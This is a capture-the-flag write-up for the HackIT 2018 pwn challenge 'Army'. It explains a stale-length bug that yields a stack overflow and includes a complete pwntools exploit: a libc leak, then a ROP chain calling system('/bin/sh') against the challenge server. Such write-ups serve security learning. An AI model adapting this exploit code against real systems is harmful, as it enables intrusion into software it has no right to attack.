# Writeup for Army - Pwn; 741  
I recently participated in HackIT CTF with noxale and solved Army, a Pwn challenge. The challenge was fun even though it wasn't very hard.  
Link to the original challenge: https://ctf.hackit.ua/challenges#Army
## The Challenge  
We get an ELF file which lets us join the army, print the details of our soldier or get a promotion - We can't actually get promoted :(  
The final goal is to get a buffer overflow due to the fact that there are 2 different global variables for ```length of answer```.  
## The Bug  
While creating a soldier we can choose what will be the size of our answer. The size we are giving it will always be updated in the soldier's struct but ```global_answer_length``` won't be updated if the malloc for this size has failed.  
[1](https://github.com/Thankjnv/CTF-Writeups/blob/master/HackIT-CTF-2018/Images/1.png)  
We can combine this problem with the functionality of 'promotion' in order to overflow into the return address.  
[2](https://github.com/Thankjnv/CTF-Writeups/blob/master/HackIT-CTF-2018/Images/2.png)  
We can see that alloca's size is based on ```soldier_struct->answer_length``` while read takes ```global_answer_length``` as its parameter.  
After attempting to get a promotion we will actually get demoted and our soldier_struct will be freed and zeroed.  
On the other hand, ```global_answer_length``` keeps its previous value.  
We can use that to our advantage.  
## The Exploit  
We are taking the following steps in order to exploit the program.  
1. Leak the remote libc (puts is printed at the start, we can use [libc-database](https://github.com/niklasb/libc-database).  
2. Create a soldier and give it a big enough answer_length (0x50 is enough).  
3. Promote the soldier, which frees it.  
4. Create a soldier again with answer_length of -1 causing malloc to fail. By doing so we will have ```soldier_struct->answer_length = -1``` and ```global_answer_length = 0x50```.  
5. Promote the soldier. This time alloca won't actually allocate more memory. We can overflow into the return address and form a rop-chain.  
6. Enjoy the shell :)  
## Way of Work  
Start by running checksec on the file and then open it with IDA.  
[3](https://github.com/Thankjnv/CTF-Writeups/blob/master/HackIT-CTF-2018/Images/3.png)  
Something caught my eye just as I opened IDA ```printf("Beginner's Luck : %s\n", &off_602020);```.  
The program prints the value of puts (an address in libc).  
We can leak the libc that the server is using with the following code and [libc-database](https://github.com/niklasb/libc-database).  
```python
#! /usr/bin/python

from pwn import *
import sys


def exploit(is_remote):
    global r
    
    if is_remote:
        r = remote('185.168.131.122', 6000)
        print 'remote'
    else:
        r = process('./army')
        print 'local'

    r.recvuntil('Luck : ')
    leaked_address = parse_addr(r.recvline())
    print 'Leaked address:', hex(leaked_address)


def parse_addr(string):
    return u64(string[:8].rstrip('\n').ljust(8, '\x00'))


if __name__ == '__main__':
    is_remote = True
    if len(sys.argv) > 1:
        if sys.argv[1] in ['-d', '-D']:
            is_remote = False
    exploit(is_remote)
```  
We find that the remote libc is ```libc6_2.23-0ubuntu10_amd64```  
[4](https://github.com/Thankjnv/CTF-Writeups/blob/master/HackIT-CTF-2018/Images/4.png)  
I opened the print_menu function and after taking a quick look at each of the other functions we understand the options that stand before us:  
1. Add a soldier (if there isn't already one).  
2. Print the soldier's details (if one exists).  
3. Get a promotion (we actually get demoted and our soldier's memory is freed and zeroed.  
  
The program has a soldier struct with the following fields:  
```C
struct soldier_struct
{
    char* name;
    int height;
    int weight;
    char* description;
    int answer_length;
};
```  
While adding a soldier we give it some data (name, height, weight, length of answer and description).  
After giving the program ```length_of_answer``` it will attempt to malloc this size. Only if the malloc succeeds it will update the value of ```global_answer_length``` as well.  
Here is the code of the function (we only care about lines 33-45):  
[5](https://github.com/Thankjnv/CTF-Writeups/blob/master/HackIT-CTF-2018/Images/5.png)  
There is nothing useful in print_details function so we are just going to skip it.  
Moving on to promotion. The function will allocate memory in the stack according to ```soldier_struct->answer_length```. Right afterwards it will do ```read(0, buf, global_answer_length);```. Since ```global_answer_length``` should always be the same as ```soldier_struct->answer_length``` we shouldn't encounter any problem, but that's not always the case.  
After trying to promote a soldier it's allocated fields will be freed and the entire struct will be zeroed. ```global_answer_length``` will remain as it was.  
As we saw earlier, ```global_answer_length``` will only be updated if the malloc of size ```length_of_answer``` succeeded.  
If we can cause ```global_answer_length``` to be bigger than ```soldier_struct->answer_length``` we will have a buffer overflow. As we just saw it's not hard to cause a mismatch between them (try allocating a negative number, malloc receives an unsigned parameter so it won't have enough memory for the allocation).  
All that is left to do is write an exploit that does the following:  
1. Read puts' address and find libc-base.  
2. Create a soldier with an answer_size greater than 0x38 (the difference between buffer's start address and the return address when we cause ```alloca(0);```).  
3. Promote it.  
4. Create a soldier with negative answer_size.  
5. Build a rop-chain and overflow the return address.  
  
We can't satisfy the constraints of a one_gadget so we will just use a ```pop rdi; ret``` that we can easily find with [ROPgadget[(https://github.com/JonathanSalwan/ROPgadget) and invoke system with '/bin/sh'.  
Here is the final exploit code (I copied the remote libc file to the local directory for easy usage).  
```python
#! /usr/bin/python

from pwn import *
import sys


def exploit(is_remote):
    global r
    
    if is_remote:
        r = remote('185.168.131.122', 6000)
        libc = ELF('./libc-2.23.so')
        bin_sh_offset = 0x18cd57 # Found it using libc-database
        print 'remote'
    else:
        r = process('./army')
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        bin_sh_offset = 0x1a3f20 # Found it using libc-database
        print 'local'
    
    puts_offset = libc.symbols['puts']
    system_offset = libc.symbols['system']
    pop_rdi_ret = 0x400d03 # pop rdi ; ret
    r.recvuntil('Luck : ')
    ''' Leak the address of puts inside libc and use it to calculate libc_base and the address of system and
        '/bin/sh' string in libc.'''
    leaked_address = parse_addr(r.recvline())
    print 'Leaked address:', hex(leaked_address)
    libc_base = leaked_address - puts_offset
    system_address = libc_base + system_offset
    bin_sh_address = libc_base + bin_sh_offset
    print 'libc address:', hex(libc_base)
    print 'system address:', hex(system_address)
    ''' Add a soldier with size 0x50 (enough to overwrite ret_addr + 2 qwords). The value of 
        global_answer_length will be 0x50. We then free the soldier (by invoking promotion).'''
    print 'bin_sh address:', hex(bin_sh_address)
    join_the_army('a', 1, 1, 0x50, 'b')
    promotion('a')
    ''' Add a soldier with size -1. That way we make malloc fail and global_answer_length will remain 50
        for our buffer overflow.'''
    join_the_army('a', 1, 1, -1, 'b')
    ''' Pad the buffer with 'A' untill we reach the return address. Overwrite the return address with a
        "pop rdi; ret" gadget. Give rdi the address of "/bin/sh" in libc and call system.'''
    payload = 'A'*0x38 + p64(pop_rdi_ret) + p64(bin_sh_address) + p64(system_address)
    promotion(payload)
    ''' Take controll over the IO and use the shell'''
    r.interactive()
    

def parse_addr(string):
    return u64(string[:8].rstrip('\n').ljust(8, '\x00'))
    
    
def menu():
    global r
    
    r.recvuntil('promotion\n')
    
def join_the_army(name, height, weight, answer_length, description):
    global r
    
    menu()
    r.sendline('1')
    r.sendlineafter('name: ', name)
    r.sendlineafter('height: ', str(height))
    r.sendlineafter('weight: ', str(weight))
    r.sendlineafter('answer: ', str(answer_length))
    if answer_length >= 0:
        r.sendlineafter('description: ', description)
    else:
        r.recvline()
    
    
def print_details():
    global r
    
    menu()
    r.sendline('2')
    return [r.recvline() for _ in range(4)]
    

def promotion(answer):
    global r
    
    menu()
    r.sendline('3')
    r.sendlineafter('answer : ', answer)
    r.recvline()
    

        
if __name__ == '__main__':
    is_remote = True
    if len(sys.argv) > 1:
        if sys.argv[1] in ['-d', '-D']:
            is_remote = False
    exploit(is_remote)
```
I can only show you the local exploit because they didn't leave the servers up.  
[6](https://github.com/Thankjnv/CTF-Writeups/blob/master/HackIT-CTF-2018/Images/6.png)  
